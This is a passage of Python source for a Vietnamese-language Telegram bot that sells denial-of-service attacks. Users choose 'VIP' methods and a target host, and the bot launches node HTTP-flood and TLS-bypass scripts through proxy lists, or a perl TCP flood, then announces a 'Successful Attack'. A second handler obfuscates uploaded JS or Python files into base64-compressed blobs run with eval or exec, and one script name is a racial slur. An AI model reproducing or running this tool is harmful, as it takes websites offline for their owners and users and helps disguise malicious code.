        port = args[3]
    else:
        port = None

    blocked_domains = ["chinhphu.vn"]   
    if method == 'VIP' or method == 'VIP2' or method == 'VIP3' or method == 'VIP4' or method == 'VIP5' or method == 'VIP6' or method == 'VIP7' or method == 'VIP8' or method == 'VIP9' or method == 'VIP10' or method == 'VIP11' or method == 'VIP12' or method == 'VIP13' or method == 'VIP14' or method == 'VIP15' or method == 'VIP16':
        for blocked_domain in blocked_domains:
            if blocked_domain in host:
                bot.reply_to(message, f"Không được phép tấn công trang web có tên miền {blocked_domain}")
                return

    if method in ['VIP', 'VIP2', 'VIP3', 'VIP4', 'VIP5', 'VIP6', 'VIP7', 'VIP8', 'VIP9', 'VIP10', 'VIP11', 'VIP12', 'VIP13', 'VIP14', 'VIP16', 'VIP15', 'TCP-HOME', 'TCP-BYPASS']:
        # Update the command and duration based on the selected method
        if method == 'VIP':
            command = ["node", "vip.js", host, "200", "6", "proxy.txt", "64"]
            duration = 200
        elif method == 'VIP2':
            command = ["node", "HTTPS-TLS.js", host, "200", "64", "6", "proxy.txt"]
            duration = 200
        elif method == 'VIP3':
            command = ["node", "http-smack.js", host, "200", "64", "6", "proxy.txt"]
            duration = 200
        elif method == 'VIP4':
            command = ["node", "4.js", host, "200", "64", "6", "proxy.txt"]
            duration = 200
        elif method == 'VIP5':
            command = ["node", "vip2.js", host, "200", "6", "proxy.txt", "64"]
            duration = 200
        elif method == 'VIP6':
            command = ["node", "6.js", host, "200", "64", "6", "proxy.txt"]
            duration = 200
        elif method == 'VIP7':
            command = ["node", "TLSV1.js", host, "200", "6", "64", "proxy.txt", "PRI"]
            duration = 200
        elif method == 'VIP8':
            command = ["node", "TLSV3.js", host, "200", "6", "64", "proxy.txt", "PRI"]
            duration = 200
        elif method == 'VIP9':
            command = ["node", "DESTROY.js", host, "200", "64", "6", "proxy.txt"]
            duration = 200
        elif method == 'VIP10':
            command = ["node", "http-load.js", host, "200", "64", "6", "proxy.txt"]
            duration = 200
        elif method == 'VIP11':
             command = ["node", "https.js", host, "200", "64", "6", "proxy.txt"]
             duration = 200
        elif method == 'VIP12':
            command = ["node", "love.js", host, "200", "6",  "proxy.txt", "64", "0"]
            duration = 200
        elif method == 'VIP13':
            command = ["node", "HTTPS-BYPASSv2.js", host, "200", "6", "proxy.txt"]
            duration = 200
        elif method == 'VIP14':
            command = ["node", "BYPASS-V3.js", "GET", host, "proxy.txt", "200", "64", "6"]
            duration = 200
        elif method == 'VIP15':
            command = ["node", "nigger.js", host, "200", "64", "6", "proxy.txt"]
            duration = 200
        elif method == 'VIP16':
            command = ["node", "vip3.js", host, "200", "6", "proxy.txt", "64"]
            duration = 200
        elif method == 'TCP-BYPASS':
            if not port.isdigit():
                bot.reply_to(message, 'Port phải là một số nguyên dương.')
                return
            command = [ ]
            duration = 200
        elif method == 'TCP-HOME':
            if not port.isdigit():
                bot.reply_to(message, 'Port phải là một số nguyên dương.')
                return
            command = ["perl", "home.pl", host, port, "3500", "200"]
            duration = 200

        cooldown_dict[username] = {'attack': current_time}

        attack_thread = threading.Thread(target=run_attack, args=(command, duration, message))
        attack_thread.start()
        bot.reply_to(message, f'┏━━━━━━━━━━━━━━┓\n┃  💣 Successful Attack VIP !!!💣\n┗━━━━━━━━━━━━━━➤\n┏━━━━━━━━━━━━━━┓\n┣➤ Attack VIP By: @{username} \n┣➤ Host: {host} \n┣➤ Methods: {method} \n┣➤ Time: {duration} Giây\n┣➤ Admin : @citylightverry\n┣➤ Check host : https://check-host.net/check-http?host={host}\n┗━━━━━━━━━━━━━━➤')
    else:
        bot.reply_to(message, 'Phương thức tấn công không hợp lệ. Sử dụng lệnh /layer7 để xem phương thức tấn công')


@bot.message_handler(commands=['enc'])
def handle_enc_command(message):
    chat_id = message.chat.id
    bot.send_message(chat_id, "Vui lòng gửi một tệp Node.js hoặc Python để mã hóa.")

@bot.message_handler(content_types=['document'])
def handle_document(message):
    chat_id = message.chat.id
    file_info = bot.get_file(message.document.file_id)
    downloaded_file = bot.download_file(file_info.file_path)
    file_extension = message.document.file_name.split('.')[-1].lower()

    # Mã hóa và nén tệp theo loại (JS hoặc PY)
    if file_extension == 'js':
        encoded_and_compressed_content = base64.b64encode(zlib.compress(downloaded_file, level=zlib.Z_BEST_COMPRESSION)).decode('utf-8')
    elif file_extension == 'py':
        encoded_and_compressed_content = base64.b64encode(zlib.compress(downloaded_file, level=zlib.Z_BEST_COMPRESSION)).decode('utf-8')
    else:
        bot.send_message(chat_id, "Loại tệp không được hỗ trợ.")
        return

    encoded_file_name = message.document.file_name + "_encoded." + file_extension

    with open(encoded_file_name, 'w') as encoded_file:
        encoded_file.write(f'# Encoded file: {message.document.file_name}\n')
        if file_extension == 'js':
            encoded_file.write('const zlib = require("zlib");\n')
        elif file_extension == 'py':
            encoded_file.write('import base64\n')
            encoded_file.write('import zlib\n')
        encoded_file.write(f'encoded_content = """{encoded_and_compressed_content}"""\n')
        if file_extension == 'js':
            encoded_file.write('decoded_content = zlib.inflateSync(Buffer.from(encoded_content, "base64")).toString();\n')
            encoded_file.write('eval(decoded_content);\n')
        elif file_extension == 'py':
            encoded_file.write('decoded_content = zlib.decompress(base64.b64decode(encoded_content)).decode("utf-8")\n')
            encoded_file.write('exec(decoded_content)\n')

    # Gửi lại tệp đã mã hóa
    with open(encoded_file_name, 'rb') as file_to_send:
        bot.send_document(chat_id, file_to_send)

    # Xóa tệp đã tạo
    import os
    os.remove(encoded_file_name)


@bot.message_handler(func=lambda message: message.text.startswith('/'))
def invalid_command(message):
    bot.reply_to(message, 'Lệnh không hợp lệ. Vui lòng sử dụng lệnh /help để xem danh sách lệnh.')

bot.infinity_polling(timeout=60, long_polling_timeout = 1)



